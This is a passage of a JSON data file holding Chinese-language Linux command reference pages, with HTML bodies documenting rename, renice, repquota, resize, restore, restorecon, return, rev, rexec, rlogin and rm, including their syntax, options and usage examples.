显示帮助文本并退出\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<hr>\n<h4 id=\"perl版本\">Perl版本</h4>\n<p>将1.txt 2.txt重命名为1.log 2.log</p>\n<pre><code class=\"language-bash\">$ <span class=\"hljs-built_in\">rename</span> -v <span class=\"hljs-string\">\"s/txt/log/g\"</span> <span class=\"hljs-number\">1.</span>txt <span class=\"hljs-number\">2.</span>txt\n<span class=\"hljs-number\">1.</span>txt renamed <span class=\"hljs-keyword\">as</span> <span class=\"hljs-number\">1.</span><span class=\"hljs-built_in\">log</span>\n<span class=\"hljs-number\">2.</span>txt renamed <span class=\"hljs-keyword\">as</span> <span class=\"hljs-number\">2.</span><span class=\"hljs-built_in\">log</span>\n</code></pre>\n<p>修改文件的后缀</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-built_in\">rename</span> <span class=\"hljs-string\">\"s//.html//.php/\"</span> *     <span class=\"hljs-comment\"># 把.html 后缀的改成 .php后缀</span>\n</code></pre>\n<p>批量添加文件后缀</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-built_in\">rename</span> <span class=\"hljs-string\">\"s/$//.txt/\"</span> *  <span class=\"hljs-comment\"># 把所有的文件名都以txt结尾</span>\n</code></pre>\n<p>批量删除文件名</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-built_in\">rename</span> <span class=\"hljs-string\">\"s//.txt//\"</span> *   <span class=\"hljs-comment\"># 把所有以.txt结尾的文件名的.txt删掉</span>\n</code></pre>\n<hr>\n<h5 id=\"c语言版本\">C语言版本</h5>\n<p>将1.txt 2.txt重命名为1.log 2.log</p>\n<pre><code class=\"language-bash\">$ rename -v txt log <span class=\"hljs-number\">1.</span>txt <span class=\"hljs-number\">2.</span>txt\n`<span class=\"hljs-number\">1.</span>txt' -&gt; `<span class=\"hljs-number\">1.</span>log'\n`<span class=\"hljs-number\">2.</span>txt' -&gt; `<span class=\"hljs-number\">2.</span>log'\n</code></pre>\n<p>文件夹中有这些文件foo1, ..., foo9, foo10, ..., foo278</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-comment\"># 把foo1到foo9的文件重命名为foo01到foo09，重命名的文件只是有4个字符长度名称的文件，文件名中的foo被替换为foo0。</span>\n<span class=\"hljs-built_in\">rename</span> foo foo0 foo?\n\n<span class=\"hljs-comment\"># foo01到foo99的所有文件都被重命名为foo001到foo099，只重命名5个字符长度名称的文件，文件名中的foo被替换为foo0。</span>\n<span class=\"hljs-built_in\">rename</span> foo foo0 foo??\n\n<span class=\"hljs-comment\"># foo001到foo278的所有文件都被重命名为foo0001到foo0278，所有以foo开头的文件都被重命名。</span>\n<span class=\"hljs-built_in\">rename</span> foo foo0 foo*\n\n<span class=\"hljs-comment\"># 从foo0200到foo0278的所有文件都被重命名为foo200到foo278，文件名中的foo0被替换为foo。</span>\n<span class=\"hljs-built_in\">rename</span> foo0 foo foo0[<span class=\"hljs-number\">2</span>]*\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "renice",
        "des": "修改正在运行的进程的调度优先级",
        "body": "<h1 id=\"renice\">renice</h1>\n<p>修改正在运行的进程的调度优先级</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>renice命令</strong> 可以修改正在运行的进程的调度优先级。预设是以程序识别码指定程序调整其优先权，您亦可以指定程序群组或用户名称调整优先权等级，并修改所有隶属于该程序群组或用户的程序的优先权。只有系统管理者可以改变其他用户程序的优先权，也仅有系统管理者可以设置负数等级。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">renice</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-g：指定进程组id；</span>\n<span class=\"hljs-deletion\">-p&lt;程序识别码&gt;：改变该程序的优先权等级，此参数为预设值。</span>\n<span class=\"hljs-deletion\">-u：指定开启进程的用户名。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>进程号：指定要修改优先级的进程。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将行程id为987及32的行程与行程拥有者为daemon及root的优先序号码加1：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">renice</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">987</span> -u daemon root -p <span class=\"hljs-number\">32</span>\n</code></pre>\n<p>注意：每一个行程都有一个唯一的id。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "repquota",
        "des": "报表的格式输出磁盘空间限制的状态",
        "body": "<h1 id=\"repquota\">repquota</h1>\n<p>报表的格式输出磁盘空间限制的状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>repquota命令</strong> 以报表的格式输出指定分区，或者文件系统的磁盘配额信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">repquota</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：列出在/etc/fstab文件里，有加入quota设置的分区的使用状况，包括用户和群组；</span>\n<span class=\"hljs-deletion\">-g：列出所有群组的磁盘空间限制；</span>\n<span class=\"hljs-deletion\">-u：列出所有用户的磁盘空间限制；</span>\n<span class=\"hljs-deletion\">-v：显示该用户或群组的所有空间限制。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件系统：要打印报表的文件系统或者对应的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>显示所有文件系统的磁盘使用情况</p>\n<pre><code class=\"language-shell\">repquota -<span class=\"hljs-selector-tag\">a</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "resize",
        "des": "命令设置终端机视窗的大小",
        "body": "<h1 id=\"resize\">resize</h1>\n<p>命令设置终端机视窗的大小</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>resize命令</strong> 命令设置终端机视窗的大小。执行resize指令可设置虚拟终端机的视窗大小。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">resize</span> <span class=\"hljs-selector-attr\">[-cu]</span><span class=\"hljs-selector-attr\">[-s &lt;列数&gt; &lt;行数&gt;]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-c 　就算用户环境并非C <span class=\"hljs-built_in\">Shell</span>，也用C <span class=\"hljs-built_in\">Shell</span>指令改变视窗大小。\n-s &lt;列数&gt; &lt;行数&gt; 　设置终端机视窗的垂直高度和水平宽度。\n-u 　就算用户环境并非Bourne <span class=\"hljs-built_in\">Shell</span>，也用Bourne <span class=\"hljs-built_in\">Shell</span>指令改变视窗大小。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用 C shell</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># resize -c</span>\n<span class=\"hljs-built_in\">set</span> <span class=\"hljs-built_in\">noglob</span>;\nsetenv COLUMNS <span class=\"hljs-string\">'99'</span>;\nsetenv LINES <span class=\"hljs-string\">'34'</span>;\n<span class=\"hljs-built_in\">unset</span> <span class=\"hljs-built_in\">noglob</span>;\n</code></pre>\n<p>使用 Bourne shell</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# resize -u\n<span class=\"hljs-attribute\">COLUMNS</span>=99;\n<span class=\"hljs-attribute\">LINES</span>=34;\n<span class=\"hljs-built_in\">export</span> COLUMNS LINES;\n</code></pre>\n<p>设置指定大小</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># resize -s 80 160</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "restore",
        "des": "所进行的操作和dump指令相反",
        "body": "<h1 id=\"restore\">restore</h1>\n<p>所进行的操作和dump指令相反</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>restore命令</strong> 是dump命令的逆过程，用于还原dump命令生成的备份文件。倾倒操作可用来备份文件，而还原操作则是写回这些已备份的文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">restore</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b&lt;区块大小&gt;：设置区块大小，单位为Byte；</span>\n<span class=\"hljs-deletion\">-c：不检查倾倒操作的备份格式，仅准许读取使用旧格式的备份文件；</span>\n<span class=\"hljs-deletion\">-C：使用对比模式，将备份的文件与现行的文件相互对比；</span>\n<span class=\"hljs-deletion\">-D&lt;文件系统&gt;：允许用户指定文件系统的名称；</span>\n<span class=\"hljs-deletion\">-f&lt;备份文件&gt;：从指定的文件中读取备份数据，进行还原操作；</span>\n<span class=\"hljs-deletion\">-h：仅解除目录而不包括与该目录相关的所有文件；</span>\n<span class=\"hljs-deletion\">-i：使用互动模式，在进行还原操作时，restore指令将依序询问用户；</span>\n<span class=\"hljs-deletion\">-m：解开符合指定的inode编号的文件或目录而非用文件名称指定；</span>\n<span class=\"hljs-deletion\">-r：进行还原操作；</span>\n<span class=\"hljs-deletion\">-R：全面还原文件系统时，检查应从何处开始进行；</span>\n<span class=\"hljs-deletion\">-s&lt;文件编号&gt;：当备份数据超过一卷磁带时，用户可以指定备份文件的编号；</span>\n<span class=\"hljs-deletion\">-t：指定文件名称，若该文件已存在备份文件中，则列出它们的名称；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-x：设置文件名称，且从指定的存储媒体里读入它们，若该文件已存在在备份文件中，则将其还原到文件系统内；</span>\n<span class=\"hljs-deletion\">-y：不询问任何问题，一律以同意回答并继续执行指令。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">dump</span> -<span class=\"hljs-number\">9</span> -u -f <span class=\"hljs-regexp\">/dev/</span>hda3 <span class=\"hljs-regexp\">/home/</span>frank/\n</code></pre>\n<p>用restore命令来恢复备份：</p>\n<pre><code class=\"language-shell\">restore rf <span class=\"hljs-regexp\">/dev/</span>hda3 <span class=\"hljs-regexp\">/home/</span>frank\n</code></pre>\n<p>用restore命令来查看备份文件里的文件列表：</p>\n<pre><code class=\"language-shell\">restore ft <span class=\"hljs-regexp\">/dev/</span>hda3\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "restorecon",
        "des": "恢复文件的安全上下文",
        "body": "<h1 id=\"restorecon\">restorecon</h1>\n<p>恢复文件的安全上下文</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>restorecon命令</strong> 用来恢复SELinux文件属性即恢复文件的安全上下文。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">restorecon <span class=\"hljs-selector-attr\">[-iFnrRv]</span> <span class=\"hljs-selector-attr\">[-e excludedir ]</span> <span class=\"hljs-selector-attr\">[-o filename ]</span> <span class=\"hljs-selector-attr\">[-f filename | pathname...]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-i：忽略不存在的文件。</span>\n<span class=\"hljs-deletion\">-f：infilename 文件 infilename 中记录要处理的文件。</span>\n<span class=\"hljs-deletion\">-e：directory 排除目录。</span>\n<span class=\"hljs-deletion\">-R/-r：递归处理目录。</span>\n<span class=\"hljs-deletion\">-n：不改变文件标签。</span>\n<span class=\"hljs-deletion\">-o/outfilename：保存文件列表到 outfilename，在文件不正确情况下。</span>\n<span class=\"hljs-deletion\">-v：将过程显示到屏幕上。</span>\n<span class=\"hljs-deletion\">-F：强制恢复文件安全语境。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>假设CentOS安装了apache，网页默认的主目录是<code>/var/www/html</code>，我们经常遇到这样的问题，在其他目录中创建了一个网页文件，然后用mv移动到网页默认目录<code>/var/www/html</code>中，但是在浏览器中却打不开这个文件，这很可能是因为这个文件的SELinux配置信息是继承原来那个目录的，与<code>/var/www/html</code>目录不同，使用mv移动的时候，这个SELinux配置信息也一起移动过来了，从而导致无法打开页面，具体请看下面的实例：</p>\n<p>使用CentOS举例,如果默认没有安装apache，确保网络连接，使用下面的命令安装</p>\n<pre><code class=\"language-shell\">[root@jsdig.com ~]# yum install httpd\n # 我们在root的家目录新建一个html文件 \n[root@jsdig.com ~]# pwd\n/root\n\n[root@jsdig.com ~]# vi index.html\n\n<span class=\"hljs-comment\"># 随便输入一段文字，保存退出 </span>\nwelcome <span class=\"hljs-keyword\">to</span> www.jsdig.com\n\n<span class=\"hljs-comment\"># 将这个文件mv到网页默认目录下 </span>\n[root@jsdig.com ~]# mv index.html /var/www/html/\n\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># 这个时候我们使用firefox浏览器输入127.0.0.1/index.html发现打不开，</span>\n<span class=\"hljs-comment\"># 查看一下SELinux的日志文件，发现了下面这一段报错信息，从这个报错信息不难看出，</span>\n<span class=\"hljs-comment\"># 进程httpd访问网页主目录中的index.html时被SELinux阻止，原因是因为，SELinux配置信息不正确,</span>\n<span class=\"hljs-comment\"># 正确的SELinux配置信息应该是scontext=后面的部分，</span>\n<span class=\"hljs-comment\"># 而index.html文件的SELinux配置信息却是tcontext=后面的部分，</span>\n<span class=\"hljs-comment\"># 从tcontext=的第三段“admin_home_t”不难看出，这个文件的SELinux配置信息是root用户家目录的。</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-attribute\">type</span>=AVC <span class=\"hljs-attribute\">msg</span>=audit(1378974214.610:465): avc:  denied  { open } <span class=\"hljs-keyword\">for</span>  <span class=\"hljs-attribute\">pid</span>=2359 <span class=\"hljs-attribute\">comm</span>=<span class=\"hljs-string\">\"httpd\"</span> <span class=\"hljs-attribute\">path</span>=<span class=\"hljs-string\">\"/var/www/html/index.html\"</span> <span class=\"hljs-attribute\">dev</span>=<span class=\"hljs-string\">\"sda1\"</span> <span class=\"hljs-attribute\">ino</span>=1317685 <span class=\"hljs-attribute\">scontext</span>=system_u:system_r:httpd_t:s0 <span class=\"hljs-attribute\">tcontext</span>=unconfined_u:object_r:admin_home_t:s0 <span class=\"hljs-attribute\">tclass</span>=file\n</code></pre>\n<p>使用ls -Z也可以看出,文件和目录的SELinux信息不匹配</p>\n<pre><code class=\"language-shell\">[root@jsdig.com html]# ls -Z <span class=\"hljs-regexp\">/var/</span>www<span class=\"hljs-regexp\">/html/</span>\n.... unconfined_u:object_r:admin_home_t:s0 index.html\n\n[root@jsdig.com html]# ls -Zd <span class=\"hljs-regexp\">/var/</span>www<span class=\"hljs-regexp\">/html/</span>\n.... system_u:object_r:httpd_sys_content_t:s0 <span class=\"hljs-regexp\">/var/</span>www<span class=\"hljs-regexp\">/html/</span>\n</code></pre>\n<p>使用restorecon来恢复网页主目录中所有文件的SELinux配置信息(如果目标为一个目录，可以添加-R参数递归)</p>\n<pre><code class=\"language-shell\">[root@jsdig.com html]# restorecon -R <span class=\"hljs-regexp\">/var/</span>www<span class=\"hljs-regexp\">/html/</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "return",
        "des": "从函数中退出并返回数值。",
        "body": "<h1 id=\"return\">return</h1>\n<p>从函数中退出并返回数值。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">return</span> [n]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>使得shell函数退出并返回数值，如果没有指定n的值，则默认为函数最后一条命令执行的返回状态。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>n（可选）：整数。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回值为你指定的参数n的值，如果你指定的参数大于255或小于0，那么会通过加或减256的方式使得返回值总是处于0到255之间。</p>\n<p>在函数外执行return语句会返回失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/usr/bin/env bash</span>\n<span class=\"hljs-comment\"># 定义一个返回值大于255的函数</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">example</span></span>() {\n  <span class=\"hljs-built_in\">return</span> 259\n}\n<span class=\"hljs-comment\"># 执行函数</span>\nexample\n<span class=\"hljs-comment\"># 显示3</span>\n<span class=\"hljs-built_in\">echo</span> $?\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "rev",
        "des": "将文件内容以字符为单位反序输出",
        "body": "<h1 id=\"rev\">rev</h1>\n<p>将文件内容以字符为单位反序输出</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rev命令</strong> 将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rev</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要反序显示内容的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]# cat iptables.bak\n# Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013\n*filter\n<span class=\"hljs-meta\">:INPUT DROP [48113:2690676]</span>\n<span class=\"hljs-meta\">:FORWARD accept [0:0]</span>\n<span class=\"hljs-meta\">:OUTPUT ACCEPT [3381959:1818595115]</span>\n-A INPUT -i lo -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p icmp -j ACCEPT\n-A OUTPUT -o lo -j ACCEPT\nCOMMIT\n# Completed on Thu Dec 26 21:25:15 2013\n\n[root@localhost ~]# rev iptables.bak \n3102 51:52:12 62 ceD uhT no 5.3.1v evas-selbatpi yb detareneG #\nretlif*\n]6760962:31184[ PORD TUPNI:\n]0:0[ TPECCA DRAWROF:\n]5115958181:9591833[ TPECCA TUPTUO:\n<span class=\"hljs-code\"> TPECCA j- ol i- TUPNI A-</span>\n<span class=\"hljs-code\"> TPECCA j- 22 tropd-- pct m- pct p- TUPNI A-</span>\n<span class=\"hljs-code\"> TPECCA j- 08 tropd-- pct m- pct p- TUPNI A-</span>\n<span class=\"hljs-code\"> TPECCA j- DEHSILBATSE,DETALER etats-- etats m- TUPNI A-</span>\n<span class=\"hljs-code\"> TPECCA j- pmci p- TUPNI A-</span>\n<span class=\"hljs-code\"> TPECCA j- ol o- TUPTUO A-</span>\nTIMMOC\n3102 51:52:12 62 ceD uhT no detelpmoC #\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rexec",
        "des": "远程执行Linux系统下命令",
        "body": "<h1 id=\"rexec\">rexec</h1>\n<p>远程执行Linux系统下命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rexec命令</strong> 用于在指定的远程Linux系统主机上执行命令，向远程rexec服务器发出执行命令的请求。</p>\n<p>rexec命令通过检查<code>$HOME/.netrc</code>文件（包含远程主机上使用的用户名和密码）来提供自动登录的功能。如果没有发现此类项或系统在安全方式下操作（参阅 securetcpip 命令），rexec命令提示输入一个远程主机的有效用户名和密码。这两种情况下，rexec均导致远程系统上的rexecd使用缺省的compat用户登录认证方法。rexecd不会为了备用的认证方法去查找<code>/etc/security/user</code>文件。也可以指定<code>-n</code>标志到rexec命令行上来重设自动登录功能。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rexec</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：表示远程命令的标准错误与标准输出相同，不支持发送任意信号到远程进程；</span>\n<span class=\"hljs-deletion\">-l&lt;用户名&gt;：指定连接远程rexec服务器的用户名；</span>\n<span class=\"hljs-deletion\">-p&lt;密码&gt;：指定连接远程rexec服务器的密码；</span>\n<span class=\"hljs-deletion\">-n：明确地提示输入用户名和密码。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  远程主机：指定远程主机（ip地址或主机名）；</li>\n<li>  命令：指定需要在远程主机上执行的命令。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>要在一个远程主机上执行date命令，输入：</p>\n<pre><code class=\"language-shell\">rexec host1 <span class=\"hljs-built_in\">date</span>\n</code></pre>\n<p>date命令的输出现在显示在本地系统上。本示例中，在本地主机上的<code>$HOME/.netrc</code>文件包含远程主机上有效的用户名和密码。如果没有远程主机的<code>$HOME/.netrc</code>文件中的有效项，将提示输入登录标识和密码。输入所要求的登录信息后，date命令的输出显示在本地系统上。</p>\n<p>要重设自动登录功能并执行远程主机上的date命令，输入：</p>\n<pre><code class=\"language-shell\">rexec -nhost1 <span class=\"hljs-built_in\">date</span>\n</code></pre>\n<p>出现提示时输入用户名和密码，date命令的输出现在显示在本地系统上。</p>\n<p>列出远程主机上另一个用户的目录，输入：</p>\n<pre><code class=\"language-shell\">rexec host1 ls -l <span class=\"hljs-regexp\">/home/</span>karen\n</code></pre>\n<p>在远程主机host1上的karen 用户的目录列表显示在本地系统上。</p>\n<p>如果没有远程主机的<code>$HOME/.netrc</code>文件中的有效项，将提示您输入登录标识和密码。输入要求的登录信息后，在远程主机host1上的karen用户的目录列表显示在本地系统上。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "rlogin",
        "des": "从当前终端登录到远程Linux主机",
        "body": "<h1 id=\"rlogin\">rlogin</h1>\n<p>从当前终端登录到远程Linux主机</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rlogin命令</strong> 用于从当前终端登录到远程Linux主机。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rlogin</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-8：允许输入8位字符数据；</span>\n<span class=\"hljs-deletion\">-e脱离字符&gt;：设置脱离字符；</span>\n<span class=\"hljs-deletion\">-E：滤除脱离字符；</span>\n<span class=\"hljs-deletion\">-l用户名称&gt;：指定要登入远端主机的用户名称；</span>\n<span class=\"hljs-deletion\">-L：使用litout模式进行远端登入阶段操作。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>远程主机：指定要登录的远程主机（ip地址或者域名）。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rm",
        "des": "用于删除给定的文件和目录",
        "body": "<h1 id=\"rm\">rm</h1>\n<p>用于删除给定的文件和目录</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rm</strong>  <strong>命令</strong> 可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉。对于链接文件，只是删除整个链接文件，而原有文件保持不变。</p>\n<p>注意：使用rm命令要格外小心。因为一旦删除了一个文件，就无法再恢复它。所以，在删除文件之前，最好再看一下文件的内容，确定是否真要删除。rm命令可以用-i选项，这个选项在使用文件扩展名字符删除多个文件时特别有用。使用这个选项，系统会要求你逐一确定是否要删除。这时，必须输入y并按Enter键，才能删除文件。如果仅按Enter键或其他字符，文件不会被删除。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rm</span> <span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：直接把欲删除的目录的硬连接数据删除成0，删除该目录；</span>\n<span class=\"hljs-deletion\">-f：强制删除文件或目录；</span>\n<span class=\"hljs-deletion\">-i：删除已有文件或目录之前先询问用户；</span>\n<span class=\"hljs-deletion\">-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；</span>\n<span class=\"hljs-deletion\">--preserve-root：不对根目录进行递归操作；</span>\n<span class=\"hljs-deletion\">-v：显示指令的详细执行过程。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定被删除的文件列表，如果参数中含有目录，则必须加上<code>-r</code>或者<code>-R</code>选项。</p>\n<h3 id=\"实例\">实例</h3>\n<p>交互式删除当前目录下的文件test和example</p>\n<pre><code class=\"language-shell\">rm -i <span class=\"hljs-keyword\">test</span> example\n<span class=\"hljs-keyword\">Remove</span> <span class=\"hljs-keyword\">test</span> ?n（不删除文件<span class=\"hljs-keyword\">test</span>)\n<span class=\"hljs-keyword\">Remove</span> example ?y（删除文件example)\n</code></pre>\n<p>删除当前目录下除隐含文件外的所有文件和子目录</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># rm -r *</span>\n</code></pre>\n<p>应注意，这样做是非常危险的!</p>\n<p><strong>rm 命令删除当前目录下的 node_modules 目录</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">'node_modules'</span> -<span class=\"hljs-built_in\">type</span> d -prune -<span class=\"hljs-built_in\">exec</span> rm -rf <span class=\"hljs-string\">'{}'</span> +\n</code></pre>\n<p><strong>rm 命令删除文件</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># rm 文件1 文件2 ...</span>\n<span class=\"hljs-attribute\">rm</span> testfile.txt\n</code></pre>\n<p><strong>rm 命令删除目录</strong></p>\n<blockquote>\n<p>rm -r [目录名称]\n-r 表示递归地删除目录下的所有文件和目录。\n-f 表示强制删除</p>\n</blockquote>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">rm</span> <span class=\"hljs-literal\">-rf</span> testdir\n<span class=\"hljs-built_in\">rm</span> <span class=\"hljs-literal\">-r</span> testdir\n</code></pre>\n<p><strong>删除操作前有确认提示</strong></p>\n<blockquote>\n<p>rm -i [文件/目录]</p>\n</blockquote>\n<pre><code class=\"language-shell\">rm -r -<span class=\"hljs-selector-tag\">i</span> testdir\n</code></pre>\n<p><strong>rm 忽略不存在的文件或目录</strong></p>\n<blockquote>\n<p>-f 选项（LCTT 译注：即 “force”）让此次操作强制执行，忽略错误提示</p>\n</blockquote>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">rm</span> <span class=\"hljs-operator\">-f</span> [文件<span class=\"hljs-type\">...</span>]\n</code></pre>\n<p><strong>仅在某些场景下确认删除</strong></p>\n<blockquote>\n<p>选项 -I，可保证在删除超过 3 个文件时或递归删除时（LCTT 译注： 如删除目录）仅提示一次确认。</p>\n</blockquote>\n<pre><code class=\"language-shell\">rm -<span class=\"hljs-selector-tag\">I</span> file1 file2 file3\n</code></pre>\n<p><strong>删除根目录</strong></p>\n<blockquote>\n<p>当然，删除根目录（/）是 Linux 用户最不想要的操作，这也就是为什么默认 rm 命令不支持在根目录上执行递归删除操作。\n然而，如果你非得完成这个操作，你需要使用 --no-preserve-root 选项。当提供此选项，rm 就不会特殊处理根目录（/）了。</p>\n</blockquote>\n<pre><code class=\"language-shell\">不给实例了，操作系统都被你删除了，你太坏了😆\n</code></pre>\n<p><strong>rm 显示当前删除操作的详情</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rm</span> -v<span class=\"hljs-meta\"> [文件/目录]</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "rmdir",
        "des": "用来删除空目录",
